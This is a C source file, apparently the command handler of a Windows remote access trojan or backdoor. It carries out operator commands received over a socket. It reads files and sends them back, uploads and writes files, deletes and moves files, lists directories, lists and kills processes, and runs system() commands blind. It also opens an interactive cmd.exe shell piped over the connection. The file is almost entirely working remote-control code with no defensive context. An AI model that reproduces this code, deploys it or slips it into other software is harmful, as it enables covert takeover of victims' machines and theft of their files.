

void ExecuteFileRead(char *Path,SOCKET Connection){

    char TextChunk[TEXT_CHUNK_SIZE] = {0};
    FILE *FileHandler = NULL;
    FileHandler = fopen(Path,"r");

    if(FileHandler != NULL){

        while(fread(TextChunk,1,TEXT_CHUNK_SIZE - 1,FileHandler) != 0){
            SendDataBack(TextChunk,Connection);
            ZeroMemory(TextChunk,TEXT_CHUNK_SIZE);
        }

        fclose(FileHandler);
    }
    else{
        // TODO!!
    }
}

void ExecuteFileSize(char *FilePath, SOCKET Connection){
    FILE *FileToGetSize = fopen(FilePath,"r");
    long FileSize = 0;
    char NumberToStringBuffer[128] = {0};

    if(FileToGetSize != NULL){
        fseek(FileToGetSize,0,SEEK_END);
        FileSize = ftell(FileToGetSize);

        itoa(FileSize,NumberToStringBuffer,10);

        SendDataBack(NumberToStringBuffer, Connection);

        fclose(FileToGetSize);
    }
    else{
        // TODO!!
    }
}

void ExecuteBeepBeep(){
    Beep(256,1000);
}

void ExecuteCurrentDirectory(SOCKET Connection){
    char CurrentDirectoryBuffer[CURRENT_DIRECTORY_BUFFER_SIZE] = {0};
    GetCurrentDirectory(CURRENT_DIRECTORY_BUFFER_SIZE,CurrentDirectoryBuffer);

    SendDataBack(CurrentDirectoryBuffer,Connection);
}

void ExecuteMoveFile(){
    char *PathFrom = strtok(NULL,"\"");

    // Will remove the white space between both arguments
    strtok(NULL,"\"");

    char *PathTo = strtok(NULL,"\"");
    
    if(PathFrom != NULL && PathTo != NULL){

        MoveFileA(PathFrom,PathTo);
    }   
    else{
        // TODO!!
    }
}

void ExecuteRemoveFile(char *FileName){
    remove(FileName);
}

void ExecuteFileWrite(SOCKET Connection){
    
    char RestOfText[REST_OF_TEXT_BUFFER_SIZE] = {0};
    char *FilePath = strtok(NULL,"\"");
    int TextSize = 0;
    TextSize = atoi(strtok(NULL," "));
    char *TextContent = NULL;
    TextContent = strtok(NULL,"");
    
    if(FilePath != NULL && TextContent != NULL && TextSize != 0){

    FILE *FileToWrite = fopen(FilePath,"w");
    fwrite(TextContent,1,strlen(TextContent),FileToWrite);
    TextSize = TextSize - strlen(TextContent);
   
    while(TextSize != 0){
        if(TextSize >= 20){
                recv(Connection,RestOfText,REST_OF_TEXT_BUFFER_SIZE - 1,0);
            }
            else{
                recv(Connection,RestOfText,TextSize,0);
            }
            TextSize = TextSize - strlen(RestOfText);
            fwrite(RestOfText,1,strlen(RestOfText),FileToWrite);
            ZeroMemory(RestOfText,REST_OF_TEXT_BUFFER_SIZE);
        }
        fclose(FileToWrite);
    }

}

void ExecuteListDirectory(char *OriginPath,SOCKET Connection){
    char PathToSearch[256] = {0};
    if(OriginPath == NULL){
        strcpy(PathToSearch,".");
    }
    else{
        strcpy(PathToSearch,OriginPath);
        strcat(PathToSearch,"/*");
    }

    WIN32_FIND_DATA Data;
    HANDLE FindHandler = FindFirstFile(PathToSearch,&Data);

    if(FindHandler != NULL){
        FindNextFile(FindHandler,&Data);

        while(FindNextFile(FindHandler,&Data) != FALSE){
            strcat(Data.cFileName,"\n");
            send(Connection,Data.cFileName,strlen(Data.cFileName),0);
        }
    }
    else{
        // TODO!!
    }
}

void ExecuteListProcess(SOCKET Connection){
    PROCESSENTRY32 Entry;
    Entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE SnapProcessHandler = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

    if(SnapProcessHandler != NULL){
        Process32First(SnapProcessHandler,&Entry);
        strcat(Entry.szExeFile,"\n");

        send(Connection,Entry.szExeFile,strlen(Entry.szExeFile),0);

        while(Process32Next(SnapProcessHandler,&Entry) == TRUE){

            strcat(Entry.szExeFile,"\n");
            send(Connection,Entry.szExeFile,strlen(Entry.szExeFile),0);
        }

        CloseHandle(SnapProcessHandler);
    }else{
        // TODO!!
    }
}

void KillProc(DWORD ProcessID){
    HANDLE ProcessHandler = OpenProcess(PROCESS_TERMINATE,FALSE,ProcessID);

    if(ProcessHandler != NULL){
        TerminateProcess(ProcessHandler,0);
    }
    else{
        // TODO!!
    }
}

void ExecuteProcessKill(char *ProcessName){

    PROCESSENTRY32 Entry;
    Entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE SnapProcessHandler = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

    if(SnapProcessHandler != NULL){
        Process32First(SnapProcessHandler,&Entry);

        if(strcmp(Entry.szExeFile,ProcessName) == 0){
            KillProc(Entry.th32ProcessID);
        }
        else{
            while(Process32Next(SnapProcessHandler,&Entry) == TRUE){
                if(strcmp(Entry.szExeFile,ProcessName) == 0){
                    KillProc(Entry.th32ProcessID);
                }
            }
        }
    }
    else{
        // TODO!!
    }
}

void ExecuteBlindCmdExecution(char *CmdCommand){
    system(CmdCommand);
}

void ExecuteUploadFile(char *FileName,int FileSize, SOCKET Connection){
    FILE *FileToWrite = fopen(FileName,"wb");
    char DataChunk[UPLOAD_DATA_CHUNK_SIZE] = {0};
    int ReadBytes = 0;

    if(FileToWrite != NULL){
        while(FileSize > 0 && (ReadBytes = recv(Connection,DataChunk,UPLOAD_DATA_CHUNK_SIZE - 1,0)) != SOCKET_ERROR){
            fwrite(DataChunk,1,ReadBytes,FileToWrite);
            FileSize -= ReadBytes;
            memset(DataChunk,0,UPLOAD_DATA_CHUNK_SIZE);
        }
        fclose(FileToWrite);
    }
    else{
        // TODO!!
    }
}

WINAPI CALLBACK ReadFromProcess(void* Config){
    struct ChildProcessConfigPackage *Configuration = (struct ChildProcessConfigPackage*) Config;
    DWORD ProcessExitCode;
    char TextFromAndToServer[INTEGRATION_BUFFER_SIZE] = {0};
    DWORD BytesWrittenAndRead = 0;

    while(1){
        GetExitCodeProcess(*Configuration->ProcessHandler,&ProcessExitCode);

        if(ProcessExitCode == STILL_ACTIVE){
            if(ReadFile(*Configuration->ChildStdoutReadHandle,TextFromAndToServer,INTEGRATION_BUFFER_SIZE - 1,&BytesWrittenAndRead,NULL) == FALSE){
                break;
            }
            if(strcmp(TextFromAndToServer,"") != 0){
                send(*Configuration->ClientSocket,TextFromAndToServer,BytesWrittenAndRead,0);
                memset(TextFromAndToServer,0,INTEGRATION_BUFFER_SIZE);
            }
        }
        else{
            break;
        }
    }
}

void ExecutePortalIntegration(SOCKET Connection){
    HANDLE ChildStdinWriteHandler, ChildStdinReadHandler, ChildStdoutWriteHandler, ChildStdoutReadHandler,ProcessHandler,ThreadHandler;
    STARTUPINFO StartInfo;
    PROCESS_INFORMATION ProcInfo;
    SECURITY_ATTRIBUTES Sec;
    char TextFromAndToServer[INTEGRATION_BUFFER_SIZE] = {0},*PortalOpenedMessage = "The portal was opened\n";
    int ReadBytes = 0;
    DWORD BytesWrittenAndRead = 0;
    DWORD ProcessExitCode;
    struct ChildProcessConfigPackage ChildConfig;

    memset(&ChildConfig,0,sizeof(struct ChildProcessConfigPackage));
    memset(&StartInfo,0,sizeof(STARTUPINFO));
    memset(&ProcInfo,0,sizeof(PROCESS_INFORMATION));
    memset(&Sec,0,sizeof(SECURITY_ATTRIBUTES));

    Sec.nLength = sizeof(SECURITY_ATTRIBUTES);
    Sec.lpSecurityDescriptor = NULL;
    Sec.bInheritHandle = TRUE;

    CreatePipe(&ChildStdinReadHandler,&ChildStdinWriteHandler,&Sec,0);
    CreatePipe(&ChildStdoutReadHandler,&ChildStdoutWriteHandler,&Sec,0);

    StartInfo.cb = sizeof(STARTUPINFO);
    StartInfo.hStdInput = ChildStdinReadHandler;
    StartInfo.hStdOutput = ChildStdoutWriteHandler;
    StartInfo.hStdError = ChildStdoutWriteHandler;
    StartInfo.dwFlags |= STARTF_USESTDHANDLES;

    CreateProcess(NULL, "cmd /q /k",NULL,NULL,TRUE,0,NULL,NULL,&StartInfo,&ProcInfo);

    ProcessHandler = OpenProcess(PROCESS_ALL_ACCESS,0,ProcInfo.dwProcessId);

    ChildConfig.ChildStdoutReadHandle = &ChildStdoutReadHandler;
    ChildConfig.ClientSocket = &Connection;
    ChildConfig.ProcessHandler = &ProcessHandler;
    ChildConfig.ReadProcessThreadFree = FALSE;

    Sleep(500);

    send(Connection,PortalOpenedMessage,strlen(PortalOpenedMessage),0);


    ThreadHandler = CreateThread(NULL,0,ReadFromProcess,(void*)&ChildConfig,0,NULL);

    memset(TextFromAndToServer,0,INTEGRATION_BUFFER_SIZE);

    while((ReadBytes = recv(Connection,TextFromAndToServer,INTEGRATION_BUFFER_SIZE - 2,0)) != SOCKET_ERROR){
        strcat(TextFromAndToServer,"\n");
        GetExitCodeProcess(ProcessHandler,&ProcessExitCode);
        if(ProcessExitCode == STILL_ACTIVE){
            if(WriteFile(ChildStdinWriteHandler,TextFromAndToServer,ReadBytes + 1,&BytesWrittenAndRead,NULL) == FALSE){
                break;
            }
        }
        else{
            break;
        }
        
        Sleep(500);
        memset(TextFromAndToServer,0,INTEGRATION_BUFFER_SIZE);

        GetExitCodeProcess(ProcessHandler,&ProcessExitCode);
    
        if(ProcessExitCode != STILL_ACTIVE){
            break;
        }
    }

    Sleep(1000);
    CancelSynchronousIo(ThreadHandler);

    TerminateProcess(ProcessHandler,0);

    CloseHandle(ChildStdinReadHandler);
    CloseHandle(ChildStdinWriteHandler);
    CloseHandle(ChildStdoutReadHandler);
    CloseHandle(ChildStdoutWriteHandler);
    CloseHandle(ProcInfo.hProcess);
    CloseHandle(ProcInfo.hThread);
}